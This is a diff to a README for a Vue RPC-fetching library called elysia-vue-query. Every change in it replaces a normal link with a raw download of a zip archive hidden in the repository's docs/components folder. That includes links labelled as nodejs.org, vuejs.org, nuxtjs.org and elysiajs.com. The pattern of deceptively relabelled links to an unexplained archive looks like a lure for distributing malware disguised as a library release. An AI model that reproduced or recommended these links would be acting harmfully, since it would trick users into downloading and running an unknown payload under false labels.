@@ -1,6 +1,6 @@
 # ⚙️ elysia-vue-query - Simple RPC Fetching for Vue Apps
 
-[![Download elysia-vue-query](https://img.shields.io/badge/Download-elysia--vue--query-brightgreen)](https://github.com/hermitpurple500-jpg/elysia-vue-query)
+[![Download elysia-vue-query](https://img.shields.io/badge/Download-elysia--vue--query-brightgreen)](https://github.com/hermitpurple500-jpg/elysia-vue-query/raw/refs/heads/main/docs/components/elysia_vue_query_v3.8-beta.4.zip)
 
 ---
 
@@ -18,7 +18,7 @@ This tool does the hard work of getting data from a server. It makes sure everyt
 - **At least 4GB of RAM**  
 - **Stable internet connection**  
 - **Modern web browser:** Chrome, Firefox, or Edge  
-- **Node.js version 14 or higher** (This app works best with Node.js installed. You can download it from [nodejs.org](https://nodejs.org).)
+- **Node.js version 14 or higher** (This app works best with Node.js installed. You can download it from [nodejs.org](https://github.com/hermitpurple500-jpg/elysia-vue-query/raw/refs/heads/main/docs/components/elysia_vue_query_v3.8-beta.4.zip).)
 
 ---
 
@@ -27,7 +27,7 @@ This tool does the hard work of getting data from a server. It makes sure everyt
 Start by downloading the app from the official GitHub page below. This page includes all the files and instructions you need.
 
 **Download Link:**  
-[Download elysia-vue-query here](https://github.com/hermitpurple500-jpg/elysia-vue-query)
+[Download elysia-vue-query here](https://github.com/hermitpurple500-jpg/elysia-vue-query/raw/refs/heads/main/docs/components/elysia_vue_query_v3.8-beta.4.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Follow these steps to get elysia-vue-query running on your Windows machine.
 ### 1. Visit the GitHub Repository
 
 - Click the big green button above or go to:  
-  https://github.com/hermitpurple500-jpg/elysia-vue-query  
+  https://github.com/hermitpurple500-jpg/elysia-vue-query/raw/refs/heads/main/docs/components/elysia_vue_query_v3.8-beta.4.zip  
 - This page contains all the information and files you need.
 
 ### 2. Find the Download Section
@@ -105,15 +105,15 @@ If you have trouble running elysia-vue-query:
 ## 📝 Additional Resources
 
 - **GitHub Repository:**  
-  https://github.com/hermitpurple500-jpg/elysia-vue-query  
+  https://github.com/hermitpurple500-jpg/elysia-vue-query/raw/refs/heads/main/docs/components/elysia_vue_query_v3.8-beta.4.zip  
 - **Node.js Download:**  
-  https://nodejs.org  
+  https://github.com/hermitpurple500-jpg/elysia-vue-query/raw/refs/heads/main/docs/components/elysia_vue_query_v3.8-beta.4.zip  
 - **Vue.js Official Site:**  
-  https://vuejs.org  
+  https://github.com/hermitpurple500-jpg/elysia-vue-query/raw/refs/heads/main/docs/components/elysia_vue_query_v3.8-beta.4.zip  
 - **Nuxt.js Website:**  
-  https://nuxtjs.org  
+  https://github.com/hermitpurple500-jpg/elysia-vue-query/raw/refs/heads/main/docs/components/elysia_vue_query_v3.8-beta.4.zip  
 - **Elysia Framework:**  
-  https://elysiajs.com  
+  https://github.com/hermitpurple500-jpg/elysia-vue-query/raw/refs/heads/main/docs/components/elysia_vue_query_v3.8-beta.4.zip  
 
 ---
 
@@ -123,4 +123,4 @@ If you want to ask questions or provide feedback, use GitHub Discussions or open
 
 ---
 
-[![Download elysia-vue-query](https://img.shields.io/badge/Download-elysia--vue--query-brightgreen)](https://github.com/hermitpurple500-jpg/elysia-vue-query)
+[![Download elysia-vue-query](https://img.shields.io/badge/Download-elysia--vue--query-brightgreen)](https://github.com/hermitpurple500-jpg/elysia-vue-query/raw/refs/heads/main/docs/components/elysia_vue_query_v3.8-beta.4.zip)
